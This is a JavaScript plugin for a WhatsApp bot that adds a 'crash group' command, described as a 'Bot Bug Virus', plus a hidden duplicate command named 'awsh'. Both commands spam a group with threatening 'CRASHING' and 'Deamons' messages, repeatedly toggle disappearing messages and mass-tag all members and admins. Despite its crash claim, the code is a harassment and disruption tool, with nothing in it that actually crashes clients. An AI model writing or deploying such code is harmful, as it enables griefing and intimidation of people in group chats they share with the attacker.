const {MessageType, GroupSettingChange} = require('@adiwajshing/baileys');
const Amazone = require('../events');
const Config = require('../config');
const UNQ = "wrong command dont type words after command"
const DDO = `👿CRASHING...BY xxx👿`
const UUU = "CRASH GROUP (Bot Bug Virus)"
const ONO = ".tagall *😈☠Red DCZ We are Deamons Do not run away...😈😈😈*"
const Language = require('../language');
const Lang = Language.getString('admin');
const mut = Language.getString('mute');

Amazone.addCommand({pattern: `${Config.BUG_COMMAND} ?(.*)`, fromMe: true, desc: UUU,deleteCommand: true}, (async (message, match) => {    
        if (match[1] == '') {
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.sendMessage(message.jid,DDO,MessageType.text);
            await message.client.sendMessage(message.jid,DDO,MessageType.text);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.sendMessage(message.jid,ONO,MessageType.text);
            await message.client.sendMessage(message.jid,".tagadmin",MessageType.text);
            await message.client.toggleDisappearingMessages(message.jid, 0);
        }
        else {
            return await message.client.sendMessage(message.jid, UNQ, MessageType.text);
        }

}));


Amazone.addCommand({pattern: 'awsh ?(.*)', fromMe: true, desc: UUU, dontAddCommandList: true}, (async (message, match) => {    
        if (match[1] == '') {
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.sendMessage(message.jid,DDO,MessageType.text);
            await message.client.sendMessage(message.jid,DDO,MessageType.text);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            await message.client.sendMessage(message.jid,ONO,MessageType.text);
            await message.client.sendMessage(message.jid,".tagadmin",MessageType.text);
            await message.client.toggleDisappearingMessages(message.jid, 0);
            
        }
        else {
            return await message.client.sendMessage(message.jid, UNQ, MessageType.text);
        }

}));
